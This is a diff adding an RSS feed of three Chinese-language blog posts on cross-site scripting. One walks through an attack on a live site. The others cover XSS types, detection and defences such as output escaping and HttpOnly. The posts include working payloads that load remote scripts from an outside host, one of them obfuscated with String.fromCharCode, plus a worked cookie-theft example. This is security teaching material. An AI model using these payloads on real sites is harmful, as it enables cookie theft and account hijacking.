@@ -1,0 +1,380 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Xss on </title>
+    <link>http://wyb0.com/tags/xss/</link>
+    <description>Recent content in Xss on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
+    <lastBuildDate>Sun, 17 Jul 2016 23:30:54 +0800</lastBuildDate>
+    <atom:link href="http://wyb0.com/tags/xss/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>XSS实例</title>
+      <link>http://wyb0.com/posts/XSS%E5%AE%9E%E4%BE%8B/</link>
+      <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/XSS%E5%AE%9E%E4%BE%8B/</guid>
+      <description>
+
+&lt;p&gt;首先感谢凯神的指导。。。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x00-注册账号:9dd4a62be6753c7def0df04cf131c9dc&#34;&gt;0x00 注册账号&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;先得到一个临时邮箱，然后注册账号
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_get_temporary_email.png&#34; alt=&#34;xss实例申请临时邮箱&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_register.png&#34; alt=&#34;xss实例注册账号&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-找输入输出点:9dd4a62be6753c7def0df04cf131c9dc&#34;&gt;0x01 找输入输出点&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_add_topic.png&#34; alt=&#34;xss实例添加关注&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_input_output_point.png&#34; alt=&#34;xss实例输入输出点&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x02-尝试构造payload:9dd4a62be6753c7def0df04cf131c9dc&#34;&gt;0x02 尝试构造payload&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;payload用如下的即可：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是这个要在点击删除时payload才起作用
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_payload_test.png&#34; alt=&#34;xss实例payload test&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用  
+但是我们若想充分利用则需要远程加载自己的js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x03-加载自己的js:9dd4a62be6753c7def0df04cf131c9dc&#34;&gt;0x03 加载自己的js&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;此时的限制条件为：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;* 30个字符
+* script标签不能自己触发
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;只能构造类似下面的语句自己加载脚本：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;a=document.createElement(&#39;script&#39;);
+a.src=&amp;quot;www.xxx.com&amp;quot;;
+document.head.appendChild(a);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;可以用如下方法分割，多次添加：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;a=document.createE/*
+*/lement(&#39;script&#39;);/*
+*/a.src=&amp;quot;www.xxx.com&amp;quot;;/*
+*/document.head.app/*
+*/endChild(a);
+
+但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;查找
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_find_loadjs.png&#34; alt=&#34;xss实例发现网站自己的加载js的函数&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;构造payload
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_short_url.png&#34; alt=&#34;xss实例使用js短网址&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;使用如下payload：
+&amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt;
+&amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt;
+&amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x04-得到cookie:9dd4a62be6753c7def0df04cf131c9dc&#34;&gt;0x04 得到Cookie&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_example_get_cookie.png&#34; alt=&#34;xss实例得到Cookie&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>XSS漏洞挖掘与利用</title>
+      <link>http://wyb0.com/posts/XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</link>
+      <pubDate>Fri, 15 Jul 2016 16:30:54 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-xss的检测:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;0x00 XSS的检测&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测&lt;br /&gt;
+手工检测：检测结果准确，但对于大型web来说费时费力&lt;br /&gt;
+软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出&lt;br /&gt;
+&lt;font color=&#34;FF0000&#34;&gt;检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出&lt;/font&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;1-手工检测:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;1. 手工检测&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;可得知输出位置:
+    • 输入敏感字符，如“&amp;lt;、&amp;gt;、&amp;quot;、&#39;、()”等，然后在提交后查看html源代码，看这些字符是否被转义。
+    • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&amp;lt;&amp;gt;&amp;quot;&amp;amp;&#39;()”字符串，然后查找AAAAAA或许比较方便。
+无法得知输出位置:
+    很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如：
+    在标签中：&amp;lt;div&amp;gt;XSS Test&amp;lt;/div&amp;gt;
+    在属性内：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;XSS Test&amp;quot; /&amp;gt;
+    这种情况通常采用输入&amp;quot;/&amp;gt;XSS Test来测试。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;2-全自动检测xss:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;2. 全自动检测XSS&lt;/h4&gt;
+
+&lt;p&gt;如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。&lt;br /&gt;
+专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。&lt;br /&gt;
+一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-xss的挖掘与利用:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;0x01 XSS的挖掘与利用&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;XSS漏洞挖掘&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;反射型XSS：
+一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严
+存储型XSS：
+可以提交内容
+提交的内容可被管理员或其他用户看到
+提交的内容没有被过滤或过滤不严
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;XSS漏洞利用
+XSS一般就是闭合标签，和SQL注入类似，常见payload如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;• &amp;lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;gt;&amp;lt;/script&amp;gt;
+• &amp;lt;img src=x onerror=&amp;quot;s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&#39;&amp;quot;;&amp;gt;
+• &amp;lt;svg onload=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&amp;gt;
+• &amp;lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,
+114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,
+115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,
+112,114,111,98,101,46,106,115)) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;0x03-xss简单示例:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;0x03 XSS简单示例&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;反射型xss简单示例:
+    • &amp;lt;?php
+          echo $_GET[&#39;x&#39;];
+      ?&amp;gt;
+    • 提交：
+      /xss.php?x=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+    • 服务端解析时就会触发弹窗
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;下面是一段经典的DOM型XSS示例：
+&amp;lt;script&amp;gt;
+    var temp = document.URL; //获取URL
+    var index = document.URL.indexOf(&amp;quot;content&amp;quot;);
+    var par = temp.substrint(index);
+    document.write(decodeURL(par)); //输入获取内容
+&amp;lt;/script&amp;gt;
+上述代码的意思是获取URL中content参数的值，并且输出，若输入http://www.xxx.com/dom.html?content=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;，就会产生XSS漏洞。
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;只要在script标签中添加JavaScript代码，就能实现一些“特殊效果”，但通常在真实攻击中
+一般使用&amp;lt;script src=&amp;quot;http://www.xxx.com/a.txt&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;的方式来加载外部脚本，
+a.txt中就存放着恶意脚本。
+
+注：JavaScript加载的脚本文件可以是任意扩展名，甚至没有也行，只要加载的文件中含有
+    JavaScript代码就会被执行。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x04-xss的防御:55be916b82f6fc34882fb7a8f948fb5c&#34;&gt;0x04 XSS的防御&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;过滤输入与输出(重点)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    @$html = $_GET[&#39;x&#39;];
+    if ($html){
+        echo htmlspecialchars($html);
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;HttpOnly&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;HttpOnly并不能防御XSS，但它能解决XSS漏洞后面的Cookie劫持攻击，防止XSS会话劫持
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>XSS初识</title>
+      <link>http://wyb0.com/posts/XSS%E5%88%9D%E8%AF%86/</link>
+      <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/XSS%E5%88%9D%E8%AF%86/</guid>
+      <description>
+
+&lt;h3 id=&#34;0x00-简介:f9ad171ba374c45520b1743f27c98beb&#34;&gt;0x00 简介&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。&lt;br /&gt;
+&lt;font color=&#34;FF0000&#34;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。&lt;/font&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x01-危害:f9ad171ba374c45520b1743f27c98beb&#34;&gt;0x01 危害&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;• 盗取管理员Cookie
+• XSS Worm
+• 挂马(水坑攻击)
+• 键盘记录(有局限性)
+• 利用网站重定向
+• 修改网页内容
+• 等等
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x02-攻击场景:f9ad171ba374c45520b1743f27c98beb&#34;&gt;0x02 攻击场景&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等
+• url的参数，回显到网页上
+• form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言
+• 等等
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;0x03-分类:f9ad171ba374c45520b1743f27c98beb&#34;&gt;0x03 分类&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。&lt;/p&gt;
+
+&lt;h4 id=&#34;1-反射型xss:f9ad171ba374c45520b1743f27c98beb&#34;&gt;1. 反射型XSS&lt;/h4&gt;
+
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;简单流程：
+    用户访问带有XSS代码的URL请求
+    服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器
+    浏览器解析带有XSS代码的数据后，最终造成XSS漏洞
+可能攻击流程：
+    • 用户aaa在网站www.xxx.com浏览网页
+    • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，
+      构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com
+    • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击
+    • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com
+    • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;2-存储型xss:f9ad171ba374c45520b1743f27c98beb&#34;&gt;2. 存储型XSS&lt;/h4&gt;
+
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;测试技巧：
+    • 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，
+    如：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot; /&amp;gt;
+    • 确定输出点后根据相应的标签构造HTML代码来闭合，如：&amp;quot; /&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;&amp;quot;，最终在html中为：
+    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;content&amp;quot; value=&amp;quot;&amp;quot; /&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;&amp;quot;&amp;quot; /&amp;gt;
+测试步骤：
+    • 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入
+    • 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：
+        a. &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;  //普通注入
+        b. &amp;quot; /&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;   //闭合标签注入
+        c. &amp;lt;/textarea&amp;gt;&#39;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;   //闭合标签注入
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;3-dom-xss:f9ad171ba374c45520b1743f27c98beb&#34;&gt;3. DOM XSS&lt;/h4&gt;
+
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;DOM的规定如下：
+    • 整个文档是一个文档节点
+    • 每个HTML标签是一个元素节点
+    • 包含在HTML元素中的文本是文本节点
+    • 每个HTML属性是一个属性节点
+    • 节点与节点之间都有等级关系
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;HTML的标签都是一个个节点，这些节点组成了DOM的整体结构：节点树，如下图：
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/xss_dom_tree.png&#34; alt=&#34;xss中DOM树.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h4 id=&#34;4-flash-xss:f9ad171ba374c45520b1743f27c98beb&#34;&gt;4. flash XSS&lt;/h4&gt;
+
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
